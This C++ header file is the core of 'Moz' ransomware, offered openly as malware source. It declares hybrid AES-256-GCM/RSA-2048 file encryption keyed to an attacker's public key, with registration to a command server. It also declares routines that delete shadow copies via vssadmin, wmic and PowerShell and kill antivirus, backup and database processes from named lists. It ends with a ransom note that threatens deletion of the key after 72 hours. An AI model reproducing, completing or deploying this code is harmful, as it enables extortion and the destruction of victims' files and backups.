// Moz Crypto Core - Hybrid Ransomware Encryption Module
// C++ Core for AES-256 + RSA-2048 hybrid encryption with file operations

#ifndef MOZ_CRYPTO_H
#define MOZ_CRYPTO_H

#include <string>
#include <vector>
#include <cstdint>
#include <memory>

namespace moz {

// AES-256-GCM encrypted data structure
struct EncryptedBlob {
    std::vector<uint8_t> ciphertext;
    std::vector<uint8_t> iv;       // 12-byte nonce for GCM
    std::vector<uint8_t> tag;      // 16-byte auth tag
    std::vector<uint8_t> aes_key;  // Encrypted AES key (RSA wrapped)
};

// RSA key pair container
struct RSAKeyPair {
    std::vector<uint8_t> public_key_der;
    std::vector<uint8_t> private_key_der;
};

// ==================== RSA Manager (asymmetric key operations) ====================
class RSAEncryptor {
public:
    RSAEncryptor();
    ~RSAEncryptor();
    
    // Generate a new RSA-2048 key pair
    bool generateKeyPair();
    
    // Load RSA public key from embedded bytes (attacker's public key)
    bool loadPublicKey(const std::vector<uint8_t>& pubkey_der);
    
    // Load RSA private key
    bool loadPrivateKey(const std::vector<uint8_t>& privkey_der);
    
    // Encrypt data with RSA public key (for wrapping AES keys)
    bool encryptWithPublicKey(const std::vector<uint8_t>& plaintext,
                              std::vector<uint8_t>& encrypted);
    
    // Decrypt data with RSA private key
    bool decryptWithPrivateKey(const std::vector<uint8_t>& encrypted,
                               std::vector<uint8_t>& decrypted);
    
    // Get public key DER bytes (for embedding/sending to C2)
    std::vector<uint8_t> getPublicKeyDER() const;
    
    // Generate and return a new RSA key pair, storing it internally
    RSAKeyPair generateAndStoreKeyPair();
    
private:
    class RSAImpl;
    std::unique_ptr<RSAImpl> impl_;
};

// ==================== AES-256-GCM Engine (symmetric encryption) ====================
class AESEngine {
public:
    AESEngine();
    ~AESEngine();
    
    // Encrypt data with AES-256-GCM
    // Returns encrypted blob with ciphertext, iv, and auth tag
    bool encryptGCM(const std::vector<uint8_t>& data,
                    const std::vector<uint8_t>& key,
                    EncryptedBlob& blob);
    
    // Decrypt data with AES-256-GCM
    bool decryptGCM(const EncryptedBlob& blob,
                    const std::vector<uint8_t>& key,
                    std::vector<uint8_t>& decrypted);
    
    // Generate a random AES-256 key
    static std::vector<uint8_t> generateKey();
    
    // Generate a random nonce/IV
    static std::vector<uint8_t> generateIV();
    
    // Derive key from password (PBKDF2)
    static std::vector<uint8_t> deriveKeyFromPassword(const std::string& password,
                                                       const std::vector<uint8_t>& salt,
                                                       int iterations = 100000);
    
private:
    class AESImpl;
    std::unique_ptr<AESImpl> impl_;
};

// ==================== File Handle ====================
class EncryptedFileHandle {
public:
    EncryptedFileHandle();
    ~EncryptedFileHandle();
    
    bool open(const std::string& path);
    bool close();
    
    const std::string& getPath() const { return path_; }
    bool isOpen() const { return is_open_; }
    
private:
    std::string path_;
    bool is_open_ = false;
};

// ==================== Hybrid Crypto Engine ====================
class CryptoEngine {
public:
    CryptoEngine();
    ~CryptoEngine();
    
    // Initialize with attacker's RSA public key for key wrapping
    bool initialize(const std::vector<uint8_t>& attacker_pubkey);
    
    // Full hybrid encryption: generates per-file AES key, encrypts data,
    // wraps AES key with RSA, returns structured blob
    bool hybridEncrypt(const std::vector<uint8_t>& data, EncryptedBlob& blob);
    
    // Full hybrid decryption: unwraps AES key with RSA private key, decrypts data
    bool hybridDecrypt(const EncryptedBlob& blob, std::vector<uint8_t>& decrypted);
    
    // Legacy single-op methods (kept for compatibility)
    bool encrypt(const std::vector<uint8_t>& data, std::vector<uint8_t>& encrypted,
                 std::string key = "");
    bool decrypt(const std::vector<uint8_t>& encrypted, std::vector<uint8_t>& decrypted,
                 std::string key = "");
    
    // Key derivation (for password-based keys)
    static std::vector<uint8_t> deriveKeyFromPassword(const std::string& password,
                                                       uint32_t saltSize = 16);
    
    // AES operations (low-level)
    bool encryptBlock(const std::vector<uint8_t>& input, std::vector<uint8_t>& output,
                      const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv);
    bool decryptBlock(const std::vector<uint8_t>& input, std::vector<uint8_t>& output,
                      const std::vector<uint8_t>& key, const std::vector<uint8_t>& iv);
    
    // Get the RSA public key for embedding or C2 registration
    std::vector<uint8_t> getPublicKeyDER() const;
    
private:
    class CryptoEngineImpl;
    std::unique_ptr<CryptoEngineImpl> impl_;
};

// ==================== File Encryption ====================
class FileEncryption {
public:
    FileEncryption();
    ~FileEncryption();
    
    // Set the crypto engine (must be initialized with attacker's public key)
    void setCryptoEngine(std::unique_ptr<CryptoEngine> engine);
    
    // Encrypt a single file using hybrid encryption
    bool encryptFile(const std::string& inputPath, const std::string& outputPath);
    
    // Decrypt a single file
    bool decryptFile(const std::string& encryptedPath, const std::string& outputPath);
    
    // Batch encrypt files with exclusions
    struct FileTargets {
        std::vector<std::string> paths;
        std::vector<std::string> skipped;
        int total_scanned = 0;
    };
    
    // Target configuration
    void setTargetExtensions(const std::vector<std::string>& extensions);
    void setMinFileSize(size_t min_bytes);
    void setMaxFileSize(size_t max_bytes);
    void addExcludeDir(const std::string& dir);
    void setExtension(const std::string& ext) { /* .moz by default */ }
    
    // Enumerate target files
    FileTargets enumerateFiles(const std::vector<std::string>& rootPaths);
    
private:
    std::unique_ptr<CryptoEngine> crypto_;
    std::vector<std::string> target_extensions_;
    size_t min_file_size_ = 1024;        // 1KB minimum
    size_t max_file_size_ = 10 * 1024 * 1024;  // 10MB maximum
    std::vector<std::string> exclude_dirs_;
    
    bool shouldEncryptFile(const std::string& path);
    bool isExcludedDir(const std::string& path);
};

// ==================== Anti-Recovery Operations ====================
class AntiRecovery {
public:
    // Delete Windows Volume Shadow Copies
    // Returns true if any method succeeded
    static bool deleteShadowCopies();
    
    // Stop specific processes by name
    static bool stopProcesses(const std::vector<std::string>& processNames);
    
    // Stop specific Windows services
    static bool stopServices(const std::vector<std::string>& serviceNames);
    
    // Stop all common backup-related processes/services
    static bool stopBackupProcesses();
    
private:
    // Individual methods for each shadow copy deletion technique
    static bool deleteShadowsViaVssAdmin();
    static bool deleteShadowsViaWmic();
    static bool deleteShadowsViaPowerShell();
};

// Platform-specific constants
#ifdef _WIN32
#define MOZ_PLATFORM_WINDOWS 1
#define MOZ_ENCRYPTED_EXTENSION ".moz"
#define MOZ_RANSOM_NOTE_NAME "README_RESTORE_FILES.txt"
#else
// Non-Windows stubs (for testing on Linux)
#define MOZ_PLATFORM_WINDOWS 0
#define MOZ_ENCRYPTED_EXTENSION ".moz"
#define MOZ_RANSOM_NOTE_NAME "README_RESTORE_FILES.txt"
#endif

// Common anti-recovery process/service lists
static const std::vector<std::string> DEFAULT_STOP_PROCESSES = {
    "MsMpEng.exe", "avp.exe", "egui.exe", "NisSrv.exe", "avastsvc.exe",
    "VSSVC.exe", "backup.exe", "VeeamBackup.exe", "sqlservr.exe",
    "mysqld.exe", "postgres.exe", "winword.exe", "excel.exe",
    "powerpnt.exe", "dropbox.exe", "googledrivesync.exe", "onedrive.exe"
};

static const std::vector<std::string> DEFAULT_STOP_SERVICES = {
    "VSS", "SQLSERVERAGENT", "MSSQLSERVER", "MySQL", "PostgreSQL",
    "BackupExecAgentAccelerator", "VeeamBackupSvc", "SharePoint"
};

// Ransom note template
static const std::string MOZ_RANSOM_NOTE_TEMPLATE = R"(
====================================
        !!! YOUR FILES ARE ENCRYPTED !!!
====================================

Your files have been locked by Moz ransomware.
To restore them, you must pay the ransom.

1. Download Tor Browser: https://www.torproject.org/
2. Navigate to: [REDACTED].onion
3. Enter your ID: {0}
4. Follow the payment instructions

WARNING: Do NOT attempt to decrypt files yourself.
         Do NOT use third-party decryption tools.
         Your data recovery is impossible without our key.

If you don't pay within 72 hours, your decryption key will be deleted permanently.
====================================
)";

} // namespace moz

#endif // MOZ_CRYPTO_H
